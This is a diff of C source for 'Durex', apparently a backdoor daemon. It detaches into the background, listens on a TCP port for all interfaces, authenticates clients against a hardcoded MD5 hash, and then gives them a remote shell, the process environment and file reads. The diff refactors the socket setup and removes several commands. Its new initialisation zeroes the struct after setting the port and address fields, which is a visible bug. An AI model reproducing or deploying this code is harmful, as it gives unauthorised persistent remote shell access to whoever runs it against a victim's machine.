@@ -2,38 +2,6 @@
 
 t_ctx durex;
 
-static void		_init(void)
-{
-	int opt = 1;
-
-	memset(&durex, 0, sizeof(durex));
-	durex.io = open("/tmp/Durex.log", O_RDWR | O_CREAT);
-	if (durex.io < 0)
-		exit(1);
-	if ((durex.msock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
-		exit(1);
-	if ((setsockopt(durex.msock,  SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) < 0)
-		exit(1);
-	durex.mport = PORT;
-	durex.rsock.sin_family = AF_INET;
-	durex.rsock.sin_port = htons(durex.mport);
-	durex.rsock.sin_addr.s_addr = htonl(INADDR_ANY);
-	if (bind(durex.msock, (struct sockaddr *)&durex.rsock,
-		sizeof(durex.rsock)) == -1)
-		_exit(1);
-	if (listen(durex.msock, MAXCLIENTS) < 0)
-		_exit(1);
-	opt = MAXCLIENTS;
-	while (opt > 0)
-	{
-		durex.client[opt].status = WAITING;
-		durex.client[opt].fd = -1;
-		durex.client[opt].pid = -1;
-		opt--;
-	}
-	_sighandler();
-}
-
 static int		_login(char *key)
 {
 	char mdfive[32] = "63a9f0ea7bb98050796b649e85481845";
@@ -55,9 +23,7 @@ static int		_recv(struct s_client *client, char **envp)
 	memset(buf, 0, sizeof(buf));
 	if ((size = read(client->fd, buf, 4095)) < 0)
 		_exit(1);
-	else if (size  == 0)
-		return (DISCONNECTED);
-	else
+	else if (size > 0)
 	{
 		buf[size-1] = 0;
 		if (client->status == LOGGING)
@@ -72,26 +38,16 @@ static int		_recv(struct s_client *client, char **envp)
 		}
 		else if (client->status == LOGGED)
 		{
-			if(strcmp(buf, "quit") == 0)
+			if(!strcmp(buf, "quit"))
 				return (CMD_QUIT);
-			else if (strcmp(buf, "shell") == 0)
-				return (_shlaunch(client));
-			else if (strcmp(buf, "help") == 0)
+			else if (!strcmp(buf, "help"))
 				return (_help(client));
-			else if (strcmp(buf, "passwd") == 0)
-				return (_shpasswd(client));
-			else if (strcmp(buf, "env") == 0)
+			else if (!strcmp(buf, "shell"))
+				return (_shlaunch(client));
+			else if (!strcmp(buf, "env"))
 				return (_shenv(client, envp));
-			else if (strncmp(buf, "get", 3) == 0)
+			else if (!strncmp(buf, "show", 4))
 				return (_shfile(client, buf));
-			else if (strcmp(buf, "check") == 0)
-				return (_schk_daemon(client));
-			else if (strcmp(buf, "update") == 0)
-			{
-				if (_init_daemon(7) == 0)
-					send(client->fd, "Daemon ok all sources fetched\n", 30, 0);
-				return (0);
-			}
 			else
 			{
 				if (strlen(buf) > 0)
@@ -99,7 +55,7 @@ static int		_recv(struct s_client *client, char **envp)
 			}
 		}
 	}
-	return (0);
+	return (size  == 0) ? (DISCONNECTED) : 0;
 }
 
 void		_rundurex(char **envp)
@@ -107,6 +63,7 @@ void		_rundurex(char **envp)
 	struct timeval tv;
 	int retval;
 	int i, client_nb = 0;
+	int opt = 1;
 	int sockmax;
 	int tmp_socket = 9999;
 	struct sockaddr_in client_sin;
@@ -114,7 +71,29 @@ void		_rundurex(char **envp)
 
 	if (daemon(0,0) < 0)
 		exit(1);
-	_init();
+	durex.mport = PORT;
+	durex.rsock.sin_family = AF_INET;
+	durex.rsock.sin_addr.s_addr = htonl(INADDR_ANY);
+	memset(&durex, 0, sizeof(durex));
+	if ((durex.io = open("/tmp/Durex.log", O_RDWR | O_CREAT)) < 0)
+		exit(1);
+	if ((durex.msock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
+		exit(1);
+	if ((setsockopt(durex.msock,  SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) < 0)
+		exit(1);
+	durex.rsock.sin_port = htons(durex.mport);
+	if (bind(durex.msock, (struct sockaddr *)&durex.rsock,
+		sizeof(durex.rsock)) == -1)
+		_exit(1);
+	if (listen(durex.msock, MAXCLIENTS) < 0)
+		_exit(1);
+	for (opt = MAXCLIENTS; opt > 0; opt--)
+	{
+		durex.client[opt].status = WAITING;
+		durex.client[opt].fd = -1;
+		durex.client[opt].pid = -1;
+	}
+	_sighandler();
 	sockmax = durex.msock;
 	while (1)
 	{
@@ -173,7 +152,7 @@ void		_rundurex(char **envp)
 						else if (retval == CMD_QUIT)
 							_exit(0);
 						else if (retval == LOGGED)
-							send(durex.client[i].fd, "User logged successfully\n", strlen("User logged successfully\n"), 0);
+							send(durex.client[i].fd, "User logged in successfully\n", 28, 0);
 						else if (retval == LOGFAIL)
 							send(durex.client[i].fd, "Code: ", 6, 0);
 						if (durex.client[i].status == LOGGED)
